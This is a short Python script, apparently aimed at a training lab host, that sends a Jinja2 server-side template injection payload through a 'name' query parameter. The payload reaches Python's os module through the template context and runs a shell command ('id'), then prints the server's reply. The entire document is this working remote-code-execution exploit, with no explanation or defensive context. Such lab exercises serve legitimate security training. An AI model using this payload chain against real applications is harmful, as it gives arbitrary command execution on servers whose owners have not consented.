import requests

base_url = "http://labs.codetoanbug.com:5000/"

payload = "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
endpoint = {"name": payload}

response = requests.get(base_url, params=endpoint)

print(response.text)